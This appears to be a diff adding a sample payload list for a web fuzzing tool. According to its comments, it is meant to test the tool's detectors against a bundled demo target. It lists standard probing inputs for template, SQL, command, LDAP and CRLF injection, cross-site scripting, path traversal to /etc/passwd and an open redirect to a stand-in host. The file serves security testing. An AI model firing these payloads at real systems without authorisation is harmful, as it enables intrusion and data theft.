@@ -1,0 +1,18 @@
+# WebFuzzer sample custom payloads (one per line).
+# Lines starting with # are ignored. Load via Payloads tab -> "⬆ Load payloads from file…".
+# These exercise every detector category against the bundled demo target.
+{{7*7}}
+{{7*'7'}}
+${7*7}
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+' OR '1'='1
+' UNION SELECT NULL,NULL-- -
+1' AND SLEEP(5)-- -
+../../../../etc/passwd
+....//....//....//etc/passwd
+;id;
+$(whoami)
+//evil.com
+%0d%0aX-Injected:%20true
+*)(|(uid=*
